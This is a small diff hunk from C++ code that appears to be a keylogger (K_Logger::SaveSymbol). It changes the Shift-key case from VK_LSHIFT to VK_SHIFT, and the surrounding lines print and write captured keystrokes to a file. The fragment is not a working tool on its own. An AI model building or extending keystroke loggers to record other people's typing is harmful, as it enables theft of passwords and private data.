@@ -708,7 +708,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("\n");
 			break;
 
-		case VK_LSHIFT:
+		case VK_SHIFT:
 			std::cout << " *Left_Shift* ";
 			WriteToFile(" *Left_Shift* ");
 			break;
